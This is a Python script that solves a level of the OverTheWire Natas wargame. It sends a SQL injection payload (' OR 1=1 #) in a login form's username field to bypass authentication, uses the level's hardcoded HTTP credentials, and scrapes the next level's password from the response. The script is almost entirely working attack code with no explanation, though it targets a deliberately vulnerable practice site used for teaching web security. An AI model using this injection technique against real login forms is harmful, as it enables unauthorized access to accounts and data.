import requests
import re
requests.packages.urllib3.disable_warnings()

url = "http://natas14.natas.labs.overthewire.org/"

s = requests.session()

def exp():
    username = '" OR 1=1 #'
    password = "doesntmatter"

    data_post = {
        "username": username,
        "password": password
    }

    r = s.post(url, auth=('natas14', 'z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ'), data=data_post, verify=False)
    if r.status_code == 200:
        get_password = re.search(r"natas15 is (.*)<br>", r.text).group(1)
        print("Password for natas15: " + get_password)

if __name__ == '__main__':
    exp()